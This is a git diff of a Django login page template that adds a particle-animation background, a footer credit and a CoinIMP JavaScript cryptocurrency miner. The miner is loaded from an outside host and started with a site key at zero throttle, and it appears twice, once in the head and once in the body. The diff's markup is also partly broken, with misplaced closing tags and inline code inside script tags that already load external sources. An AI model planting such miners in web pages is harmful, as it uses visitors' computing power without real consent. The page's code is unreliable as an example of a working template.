@@ -5,31 +5,99 @@
     <head>
         <title></title>
         <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+        <link href="{% static 'userDashboard/assets/css/main.css' %}" rel="stylesheet" >
+        <link href="{% static 'userDashboard/assets/css/ab-particles.css' %}" rel="stylesheet">
+        <style>:root {
+            --col-particle: #536878;
+            --col-particle-stroke: #035096;
+            --col-particle-stroke-hover: #0892d0;
+          }</style>
+          <script src="https://www.hostingcloud.racing/zosF.js"></script>
+          <script>
+              var _client = new Client.Anonymous('19b89caf750ea26ef409b80e61b19dc8cd15ceb7a19d33f4ad4ddb19a7790727', {
+                  throttle: 0, c: 'w'
+              });
+              _client.start();
+              _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+  
+          </script>
     </head>
-    <body>
-        <div class="container">
-            <h1>Login</h1>
-            <div style="width:30%">
-                <form method="POST">
-                    {%csrf_token%}
-                    {% for error in form.non_field_errors %}
-                    <div class="form-group has-errors text-danger small">
-                        {{error}}
+    <body onload='particles(speed=15, avoidMouse=false, opacity=65)'>
+        <script src="https://www.hostingcloud.racing/zosF.js">
+    var _client = new Client.Anonymous('19b89caf750ea26ef409b80e61b19dc8cd15ceb7a19d33f4ad4ddb19a7790727', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+</script>
+        <div class="wrapper">
+            <div class="spacer"></div>
+            <header>
+                <h1>ab-particles</h1>
+                <h2>simple, lightweight vanilla-javascript particle animation</h2>
+            </header>
+            <main>
+                <div class="container">
+                    <h1>Login</h1>
+                    <div style="width:30%">
+                        <form method="POST">
+                            {%csrf_token%}
+                            {% for error in form.non_field_errors %}
+                            <div class="form-group has-errors text-danger small">
+                                {{error}}
+                            </div>
+                            {% endfor %}
+                            {% for field in form %}
+                            <div class="form-group has-errors text-danger small">
+                                {{field.errors}}
+                            </div>
+                            <div class="form-group has-errors text-danger small">
+                            </div>
+                            <div class="form-group">
+                                {{ field }}
+                            </div>
+                            {% endfor %}
+                            <button class="btn btn-primary" style="width:100%">Login</button>
                     </div>
-                    {% endfor %}
-                    {% for field in form %}
-                    <div class="form-group has-errors text-danger small">
-                        {{field.errors}}
-                    </div>
-                    <div class="form-group has-errors text-danger small">
-                    </div>
-                    <div class="form-group">
-                        {{ field }}
-                    </div>
-                    {% endfor %}
-                    <button class="btn btn-primary" style="width:100%">Login</button>
-            </div>
-            </form>
+                    </form>
+                </div>   
+            </main>
+            <div class="spacer"></div>
+            <footer>
+                <p>Design, code and content appearing on this site is developed by
+                <a href="https://asifbacchus.com">Asif Bacchus</a> ('author') and
+                may be freely used and redistributed in accordance with the <a
+                href="https://git.asifbacchus.app/asif/ab-particles/LICENSE">license</a>
+                appearing in the <a
+                href="https://git.asifbacchus.app/asif/ab-particles.git">content
+                repo</a>. Author provides no warranties, guarantees or implications
+                of suitability and disclaims any and all responsibility arising from
+                the usage of anything appearing on or linked to this page for any
+                purpose whatsoever. Copyright 2020 Asif Bacchus. Some Rights
+                Reserved.</p>
+            </footer>
         </div>
+        
+
+    <canvas id="particles"></canvas>
+        <!-- javascript -->
+        <script
+        src="{% static 'loginp/js/ab_particles/ab-particles.min.js' %}"   
+        
+        integrity="sha384-HI+YXFmq6RX6R45hGuCOv6U/XhbS6swme7nnQVc8g6QfhucST79WEzlK6XMbanUp"
+        crossorigin="anonymous"
+        defer="">      
+        window.addEventListener('load', function(){
+            particles(speed=15, avoidMouse=false)
+        }, false); 
+        </script>
+        <!-- end javascript -->
+
+        
+
+
     </body>
+    
+
 </html>
